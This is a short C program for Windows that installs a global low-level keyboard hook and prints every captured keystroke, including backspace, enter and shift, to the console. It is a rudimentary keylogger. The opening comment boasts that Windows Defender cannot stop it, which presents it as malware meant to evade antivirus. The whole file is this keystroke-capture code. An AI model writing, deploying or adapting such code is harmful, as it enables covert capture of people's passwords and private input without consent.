// windows defender are sucks btw, it cant stop this
#include <windows.h>
#include <stdio.h>

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *) lParam;
    //symbol handling
    if(wParam == WM_KEYDOWN) {
        switch(pkey->vkCode) {
            case VK_BACK:
                printf("(BACKSPACE)");
                break;
            case VK_RETURN:
                printf("\n");
                break;
            case VK_RSHIFT:
            case VK_LSHIFT:
                printf("(SHIFT)");
                break;
            case VK_TAB:
                printf("\t");
                break;
            default:
                //otherwise, go here
                printf("%c", pkey->vkCode);
                break;
        }
    }
        
    return CallNextHookEx(NULL, code, wParam, lParam);
}


int main() {
    //low level keyboard hook, here
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (hhook == NULL)
        printf("hook wasnt installed");
    printf("hook installed succesfully");

    //messages loop here
    MSG msg;
    while((GetMessage(&msg, NULL, 0, 0)) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}